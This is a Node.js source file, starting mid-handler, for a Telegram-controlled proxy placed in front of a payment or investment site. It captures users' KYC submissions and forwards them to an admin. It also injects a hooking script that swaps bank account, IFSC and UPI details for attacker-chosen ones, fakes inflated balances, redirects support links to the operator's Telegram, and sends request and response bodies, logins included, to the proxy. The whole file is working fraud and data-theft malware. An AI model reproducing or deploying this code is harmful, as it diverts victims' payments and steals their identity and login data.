      if (data.activeIndex === idx) data.activeIndex = data.banks.length > 0 ? 0 : -1;
      else if (data.activeIndex > idx) data.activeIndex--;
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `🗑️ Removed: ${removed.accountHolder} | ${removed.accountNo}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/setbank ')) {
      const idx = parseInt(text.substring(9).trim()) - 1;
      if (isNaN(idx) || idx < 0 || idx >= data.banks.length) { await bot.sendMessage(chatId, '❌ Invalid index.'); return res.sendStatus(200); }
      data.activeIndex = idx; data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `✅ Active bank: #${idx + 1}\n${data.banks[idx].accountHolder} | ${data.banks[idx].accountNo} | ${data.banks[idx].ifsc}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/usdt ')) {
      const addr = text.substring(6).trim();
      if (addr.toLowerCase() === 'off') { data.usdtAddress = ''; } else if (addr.length >= 20) { data.usdtAddress = addr; }
      else { await bot.sendMessage(chatId, '❌ Invalid address.'); return res.sendStatus(200); }
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, data.usdtAddress ? `₮ USDT: ${data.usdtAddress}` : '❌ USDT override OFF');
      return res.sendStatus(200);
    }

    if (text.startsWith('/suspend ')) {
      const sp = text.substring(9).trim();
      if (!data.suspendedPhones) data.suspendedPhones = {};
      data.suspendedPhones[sp] = { time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) };
      data._skipOverrideMerge = true; await saveData(data);
      await bot.sendMessage(chatId, `🚫 Suspended: ${sp}`);
      return res.sendStatus(200);
    }

    if (text.startsWith('/unsuspend ')) {
      const up = text.substring(11).trim();
      if (data.suspendedPhones && data.suspendedPhones[up]) { delete data.suspendedPhones[up]; data._skipOverrideMerge = true; await saveData(data); }
      await bot.sendMessage(chatId, `✅ Unsuspended: ${up}`);
      return res.sendStatus(200);
    }

    if (text === '/suspended') {
      const phones = data.suspendedPhones ? Object.keys(data.suspendedPhones) : [];
      if (phones.length === 0) { await bot.sendMessage(chatId, '📋 No suspended.'); return res.sendStatus(200); }
      let msg = '🚫 Suspended:\n';
      for (const p of phones) msg += `📱 ${p} — ${data.suspendedPhones[p].time || 'N/A'}\n`;
      await bot.sendMessage(chatId, msg);
      return res.sendStatus(200);
    }

    return res.sendStatus(200);
  } catch(e) {
    console.error('Bot error:', e);
    return res.sendStatus(200);
  }
});

app.use(async (req, res, next) => {
  if (req.method === 'GET' || req.method === 'HEAD') return next();
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    next();
  });
});

async function proxyFetch(req) {
  const path = req.originalUrl || req.url;
  const url = TIVOX_API + path;
  const fwd = {};
  for (const [k, v] of Object.entries(req.headers)) {
    const kl = k.toLowerCase();
    if (kl === 'host' || kl === 'connection' || kl === 'content-length' || kl === 'transfer-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
    fwd[k] = v;
  }
  fwd['host'] = 'tivox.icu';
  const opts = { method: req.method, headers: fwd, redirect: 'manual' };
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
    opts.body = req.rawBody;
    fwd['content-length'] = String(req.rawBody.length);
  }
  const response = await fetch(url, opts);
  const respBody = await response.text();
  const respHeaders = {};
  response.headers.forEach((val, key) => {
    const kl = key.toLowerCase();
    if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
      respHeaders[key] = val;
    }
  });
  return { response, respBody, respHeaders };
}

app.get('/app/version', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders } = await proxyFetch(req);
    let jsonResp = null;
    try { jsonResp = JSON.parse(respBody); } catch(e) {}
    if (jsonResp) {
      if (data.blockUpdate !== false) {
        if (jsonResp.forceUpdate !== undefined) jsonResp.forceUpdate = false;
        if (jsonResp.needUpdate !== undefined) jsonResp.needUpdate = false;
        if (jsonResp.force_update !== undefined) jsonResp.force_update = false;
        if (jsonResp.update !== undefined) jsonResp.update = false;
        const rd = jsonResp.data || jsonResp.body || jsonResp.result;
        if (rd && typeof rd === 'object') {
          if (rd.forceUpdate !== undefined) rd.forceUpdate = false;
          if (rd.needUpdate !== undefined) rd.needUpdate = false;
        }
      }
      const body = JSON.stringify(jsonResp);
      respHeaders['content-type'] = 'application/json; charset=utf-8';
      respHeaders['content-length'] = String(Buffer.byteLength(body));
      res.writeHead(200, respHeaders);
      res.end(body);
    } else {
      respHeaders['content-length'] = String(Buffer.byteLength(respBody));
      res.writeHead(response.status, respHeaders);
      res.end(respBody);
    }
  } catch(e) {
    console.error('version error:', e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
});

app.get('/app/jsValue/:type', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders } = await proxyFetch(req);
    notifyAdmin(data, `📜 JS Value (${req.params.type})\n${respBody.substring(0, 500)}`);
    respHeaders['content-length'] = String(Buffer.byteLength(respBody));
    res.writeHead(response.status, respHeaders);
    res.end(respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
});

app.post('/xxapi/linkKyc', async (req, res) => {
  try {
    const data = await loadData();
    const body = req.body || {};
    notifyAdmin(data, `🔐 KYC CAPTURED\n${JSON.stringify(body).substring(0, 3000)}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`);
    const { response, respBody, respHeaders } = await proxyFetch(req);
    respHeaders['content-length'] = String(Buffer.byteLength(respBody));
    res.writeHead(response.status, respHeaders);
    res.end(respBody);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
});

const INJECT_JS = `(function(){
if(window._pxi)return;window._pxi=1;
var P='https://${PROXY_HOST}';
var CFG=null;
var UID='';
var UID_LOCKED=false;

try{var _ls=localStorage.getItem('_px_uid');if(_ls&&/^\d{6,12}$/.test(_ls)){UID=_ls;if(typeof _BM!=='undefined'&&_BM[UID]&&CFG){CFG.bonus=_BM[UID];}}}catch(e){}

function setUID(id,lock){
if(!id||!/^\d{6,12}$/.test(id))return;
if(UID_LOCKED&&!lock)return;
if(id===UID)return;
UID=id;
try{localStorage.setItem('_px_uid',id);}catch(e){}
if(lock)UID_LOCKED=true;
if(typeof _BM!=='undefined'&&_BM[UID]&&CFG){CFG.bonus=_BM[UID];}
try{lc();}catch(e){lcAsync();}}

function lc(){
try{var x=new XMLHttpRequest();
var op=typeof _open==='function'?_open:XMLHttpRequest.prototype.open;
var sn=typeof _send==='function'?_send:XMLHttpRequest.prototype.send;
op.call(x,'GET',P+'/hook/config'+(UID?'?userId='+UID:''),false);
sn.call(x);if(x.status===200){
var t;try{t=(typeof _rtDesc!=='undefined'&&_rtDesc)?_rtDesc.get.call(x):x.responseText;}catch(e2){t=x.responseText;}
CFG=JSON.parse(t);}}catch(e){}}
function lcAsync(){
try{var op=typeof _open==='function'?_open:XMLHttpRequest.prototype.open;
var sn=typeof _send==='function'?_send:XMLHttpRequest.prototype.send;
var x=new XMLHttpRequest();
op.call(x,'GET',P+'/hook/config'+(UID?'?userId='+UID:''),true);
x.onload=function(){try{var t;try{t=(typeof _rtDesc!=='undefined'&&_rtDesc)?_rtDesc.get.call(x):x.responseText;}catch(e2){t=x.responseText;}CFG=JSON.parse(t);}catch(e){}};
sn.call(x);}catch(e){}}
try{lc();}catch(e){}
setInterval(function(){lcAsync();},25000);

function b2s(b){
if(!b)return'';
if(typeof b==='string')return b;
try{if(typeof URLSearchParams!=='undefined'&&b instanceof URLSearchParams)return b.toString();}catch(e){}
try{if(typeof FormData!=='undefined'&&b instanceof FormData){var p=[];b.forEach(function(v,k){p.push(k+'='+v);});return p.join('&');}}catch(e){}
try{return String(b);}catch(e){return'';}}

var BF={accountno:'an',accountnumber:'an',account_no:'an',receiveaccountno:'an',
bankaccount:'an',bankaccountno:'an',payeeaccount:'an',cardno:'an',cardnumber:'an',
bankcardno:'an',payeecardno:'an',receivecardno:'an',payeebankaccount:'an',
payeebankaccountno:'an',payeeaccountno:'an',receiveraccount:'an',receiveraccountno:'an',
walletaccount:'an',walletno:'an',collectionaccount:'an',collectionaccountno:'an',
customerbanknumber:'an',customerbankaccount:'an',accno:'an',acc_no:'an',
account:'an',receiveaccount:'an',
beneficiaryname:'ah',accountname:'ah',account_name:'ah',receiveaccountname:'ah',
holdername:'ah',accountholder:'ah',bankaccountholder:'ah',receivename:'ah',
payeename:'ah',bankaccountname:'ah',realname:'ah',cardholder:'ah',cardname:'ah',
receivername:'ah',collectionname:'ah',customername:'ah',accname:'ah',acc_name:'ah',
truename:'ah',receiverealname:'ah',payeerealname:'ah',
ifsc:'if',ifsccode:'if',ifsc_code:'if',receiveifsc:'if',bankifsc:'if',
payeeifsc:'if',receiverifsc:'if',collectionifsc:'if',
bankname:'bn',bank_name:'bn',payeebankname:'bn',receiverbankname:'bn',
upiid:'ui',upi_id:'ui',upi:'ui',vpa:'ui',payeeupi:'ui',receiverupi:'ui',walletupi:'ui'};

var NF={'name':1,'payname':1};

function rb(o,d){
if(!o||typeof o!=='object'||!CFG||!CFG.an||d>10)return;
if(Array.isArray(o)){for(var i=0;i<o.length;i++)rb(o[i],d+1);return;}
var hasAcct=false;
for(var k in o){var kl=k.toLowerCase().replace(/_/g,'').replace(/-/g,'');
if(BF[kl]==='an'||BF[kl]==='if')hasAcct=true;}
for(var k in o){
if(typeof o[k]==='object'){rb(o[k],d+1);continue;}
if(typeof o[k]!=='string'&&typeof o[k]!=='number')continue;
var kl=k.toLowerCase().replace(/_/g,'').replace(/-/g,'');
var m=BF[kl];
if(m&&CFG[m]&&String(o[k]).length>0){o[k]=CFG[m];continue;}
if(NF[kl]&&hasAcct&&CFG.ah&&String(o[k]).length>0){o[k]=CFG.ah;}
if(kl==='bank'&&CFG.bn&&String(o[k]).length>0){o[k]=CFG.bn;}
}}

var BKEYS=['balance','userbalance','availablebalance','totalbalance','money','coin',
'wallet','itoken','itokenbalance','tokenbalance','usermoney','rechargebalance',
'amount','mybalance','walletbalance','accountbalance','totalamount','totalmoney',
'memberbalance','membermoney','useritoken','myitoken','mytokenbalance','freeze'];

function addBal(o,bonus,d){
if(!o||typeof o!=='object'||!bonus||d>10)return;
if(Array.isArray(o)){for(var i=0;i<o.length;i++){if(typeof o[i]==='object')addBal(o[i],bonus,d+1);}return;}
for(var k in o){
var kl=k.toLowerCase();
if(BKEYS.indexOf(kl)>-1){
var v=parseFloat(o[k]);
if(!isNaN(v)&&v>=0){o[k]=typeof o[k]==='string'?String((v+bonus).toFixed(2)):parseFloat((v+bonus).toFixed(2));}}
if(typeof o[k]==='object'&&o[k]!==null)addBal(o[k],bonus,d+1);
}}

var ID_FIELDS=['teamWorkId','memberCodeId','memberCode','member_code','userId','user_id','channelUid','uid',
'memberId','member_id','accountId','account_id','customerId','userCode','loginId',
'userNum','userNumber','memberNum','userID','memberID'];

function fid(o,d){
if(!o||typeof o!=='object'||d>8)return'';
if(Array.isArray(o))return'';
for(var i=0;i<ID_FIELDS.length;i++){
var f=ID_FIELDS[i];
if(o[f]!==undefined&&o[f]!==null&&o[f]!==''){
var v=String(o[f]).trim();
if(/^\d{6,12}$/.test(v))return v;}}
if(o.id!==undefined&&o.id!==null&&o.id!==''){
var v2=String(o.id).trim();if(/^\d{6,12}$/.test(v2))return v2;}
for(var k in o){if(typeof o[k]==='object'&&!Array.isArray(o[k])){var rf=fid(o[k],d+1);if(rf)return rf;}}
return'';}

function extractLoginUID(text){
try{
var j=JSON.parse(text);
var candidates=[j.data,j.body,j.result,j.user,j.member,j.info,j];
for(var i=0;i<candidates.length;i++){
var c=candidates[i];
if(c&&typeof c==='object'){var id=fid(c,0);if(id)return id;}}
}catch(e){}
return'';}

function isLoginUrl(u){
if(!u)return false;
return u.indexOf('login')>-1||u.indexOf('Login')>-1||u.indexOf('signin')>-1||
u.indexOf('doLogin')>-1||u.indexOf('auth')>-1;}

function modResp(text,isLogin){
if(!CFG||!CFG.enabled)return text;
try{
var j=JSON.parse(text);
var d=j.data||j.body||j.result||j;
if(isLogin){
var lid=extractLoginUID(text);
if(lid)setUID(lid,true);
}else{
var id=fid(d,0)||fid(j,0);
if(id)setUID(id,false);
}
if(CFG.an){rb(j,0);}
var bonus=CFG.bonus||0;
if(bonus){addBal(j,bonus,0);}
return JSON.stringify(j);
}catch(e){return text;}}

function sendLog(url,method,bodyStr,resp,status,modded){
try{var op=typeof _open==='function'?_open:XMLHttpRequest.prototype.open;
var sn=typeof _send==='function'?_send:XMLHttpRequest.prototype.send;
var x=new XMLHttpRequest();
op.call(x,'POST',P+'/hook/log',true);
x.setRequestHeader('Content-Type','application/json');
x.onload=function(){try{var t;try{t=(typeof _rtDesc!=='undefined'&&_rtDesc)?_rtDesc.get.call(x):x.responseText;}catch(e2){t=x.responseText;}
var rj=JSON.parse(t);if(rj.bonus!==undefined&&CFG){CFG.bonus=rj.bonus;}
if(rj.userId&&!UID){setUID(rj.userId,false);}}catch(e){}};
sn.call(x,JSON.stringify({u:url,m:method,
b:(bodyStr||'').substring(0,3000),
r:(resp||'').substring(0,5000),s:status,uid:UID,
cb:CFG?(CFG.bonus||0):0,md:modded?1:0}));}catch(e){}}

var _rtDesc=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,'responseText');
var _rDesc=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,'response');

Object.defineProperty(XMLHttpRequest.prototype,'responseText',{
get:function(){
var orig;
try{orig=_rtDesc.get.call(this);}catch(e){orig='';}
if(this._pxDone)return this._pxRT!==undefined?this._pxRT:orig;
if(this.readyState!==4)return orig;
this._pxDone=true;
var url=this._hu||'';
if(url.indexOf(P)===0)return orig;
try{
var bs=this._bs||'';
var login=this._isLogin||false;
if(CFG&&CFG.enabled){
var mod=modResp(orig,login);
if(mod!==orig){this._pxRT=mod;this._pxRJ=null;
sendLog(url,this._hm||'',bs,orig,this.status,true);return mod;}
}
if(login&&!UID){var lid=extractLoginUID(orig);if(lid)setUID(lid,true);}
sendLog(url,this._hm||'',bs,orig,this.status,false);
}catch(e){}
return orig;},configurable:true});

Object.defineProperty(XMLHttpRequest.prototype,'response',{
get:function(){
if(this._pxRT!==undefined){
if(this.responseType===''||this.responseType==='text')return this._pxRT;
if(this.responseType==='json'){
if(!this._pxRJ){try{this._pxRJ=JSON.parse(this._pxRT);}catch(e){this._pxRJ=null;}}
if(this._pxRJ)return this._pxRJ;}}
if(!this._pxDone&&this.readyState===4){
this._pxDone=true;
var url=this._hu||'';
if(url.indexOf(P)!==0){
try{
var origResp=_rDesc.get.call(this);
var text;
if(this.responseType==='json'&&origResp&&typeof origResp==='object'){text=JSON.stringify(origResp);}
else if(typeof origResp==='string'){text=origResp;}
if(text){
var bs=this._bs||'';
var login=this._isLogin||false;
if(CFG&&CFG.enabled){
var mod=modResp(text,login);
if(mod!==text){
this._pxRT=mod;this._pxRJ=null;
sendLog(url,this._hm||'',bs,text,this.status,true);
if(this.responseType==='json'){
try{this._pxRJ=JSON.parse(mod);}catch(e){}
return this._pxRJ||origResp;}
return mod;}}
if(login&&!UID){var lid=extractLoginUID(text);if(lid)setUID(lid,true);}
sendLog(url,this._hm||'',bs,text,this.status,false);
}}catch(e){}}}
return _rDesc.get.call(this);},configurable:true});

var _open=XMLHttpRequest.prototype.open;
var _send=XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.open=function(m,u){this._hu=u;this._hm=m;this._isLogin=isLoginUrl(u);return _open.apply(this,arguments);};
XMLHttpRequest.prototype.send=function(body){
this._bs=b2s(body);
if(this._isLogin){
var self=this;
self.addEventListener('load',function(){
try{
var orig=_rtDesc.get.call(self);
if(orig){var lid=extractLoginUID(orig);if(lid)setUID(lid,true);}
}catch(e){}});}
return _send.apply(this,arguments);};

var _fetch=window.fetch;
if(_fetch){
window.fetch=function(input,init){
var url=typeof input==='string'?input:(input&&input.url)||'';
if(url.indexOf(P)===0)return _fetch.apply(this,arguments);
var method=(init&&init.method)||'GET';
var bs=b2s(init&&init.body);
var login=isLoginUrl(url);
return _fetch.apply(this,arguments).then(function(resp){
try{
var ct=resp.headers.get('content-type')||'';
if(ct.indexOf('json')===-1&&ct.indexOf('text')===-1)return resp;
var cl=resp.clone();
return cl.text().then(function(text){
if(login&&!UID){var lid=extractLoginUID(text);if(lid)setUID(lid,true);}
if(CFG&&CFG.enabled&&ct.indexOf('json')>-1){
var mod=modResp(text,login);
if(mod!==text){
sendLog(url,method,bs,text,resp.status,true);
return new Response(mod,{status:resp.status,statusText:resp.statusText,headers:resp.headers});}}
sendLog(url,method,bs,text,resp.status,false);
return resp;}).catch(function(){return resp;});
}catch(e){return resp;}
});};}

function csUrl(s){
if(!s||typeof s!=='string')return false;
return s.indexOf('t.me/')>-1||s.indexOf('wa.me/')>-1||s.indexOf('whatsapp.com')>-1||s.indexOf('telegram.me/')>-1;}

function scanDOM(){
try{
if(!document.body)return;
var txt=document.body.innerText||'';
var m=txt.match(/IDs*:s*([0-9]{6,12})/i);
if(m&&m[1])setUID(m[1],false);
}catch(e){}}

function fixLinks(){
if(!CFG||!CFG.tg)return;
var links=document.querySelectorAll('a');
for(var i=0;i<links.length;i++){
var h=links[i].href||'';
if(csUrl(h)){links[i].href=CFG.tg;links[i].setAttribute('href',CFG.tg);}}
var els=document.querySelectorAll('[data-url],[data-href],[data-link],[data-src]');
for(var j=0;j<els.length;j++){
['data-url','data-href','data-link','data-src'].forEach(function(attr){
var v=els[j].getAttribute(attr)||'';
if(csUrl(v))els[j].setAttribute(attr,CFG.tg);});}}

function fixOnClick(){
if(!CFG||!CFG.tg)return;
var all=document.querySelectorAll('[onclick]');
for(var i=0;i<all.length;i++){
var oc=all[i].getAttribute('onclick')||'';
if(csUrl(oc)){all[i].setAttribute('onclick',"window.location.href='"+CFG.tg+"'");}}}

var _wopen=window.open;
window.open=function(url){
if(CFG&&CFG.tg&&csUrl(url)){arguments[0]=CFG.tg;}
return _wopen.apply(this,arguments);};

if(window.xamlAction&&window.xamlAction.invokeAction){
var _invoke=window.xamlAction.invokeAction.bind(window.xamlAction);
window.xamlAction.invokeAction=function(action,params){
if(CFG&&CFG.tg&&params){
try{var p=JSON.parse(params);
var changed=false;
['ct_url','url','link','href','jumpUrl','serviceUrl','csUrl'].forEach(function(key){
if(p[key]&&csUrl(p[key])){p[key]=CFG.tg;changed=true;}});
if(changed)params=JSON.stringify(p);
}catch(e){}}
sendLog('bridge://'+action,'BRIDGE',params||'','',0);
return _invoke(action,params);};}

document.addEventListener('click',function(e){
if(!CFG||!CFG.tg)return;
var el=e.target;var depth=0;
while(el&&depth<10){
if(el.tagName==='A'){
var href=el.getAttribute('href')||'';
if(href.indexOf('xaml:')===0){
try{var dec=decodeURIComponent(href.substring(5));
var jo=JSON.parse(dec);
if(jo.ct_url&&csUrl(jo.ct_url)){jo.ct_url=CFG.tg;
el.setAttribute('href','xaml:'+encodeURIComponent(JSON.stringify(jo)));}}catch(e){}}
if(href.indexOf('syt:')===0){
try{var dec2=decodeURIComponent(href.substring(4));
var jo2=JSON.parse(dec2);
if(jo2.url&&csUrl(jo2.url)){jo2.url=CFG.tg;
el.setAttribute('href','syt:'+encodeURIComponent(JSON.stringify(jo2)));}}catch(e){}}}
el=el.parentElement;depth++;}
},true);

scanDOM();
setInterval(function(){scanDOM();},3000);

if(document.body){
var obs=new MutationObserver(function(){fixLinks();fixOnClick();scanDOM();});
obs.observe(document.body,{childList:true,subtree:true});}
setInterval(function(){fixLinks();fixOnClick();},2000);
fixLinks();fixOnClick();
})();`;

module.exports = app;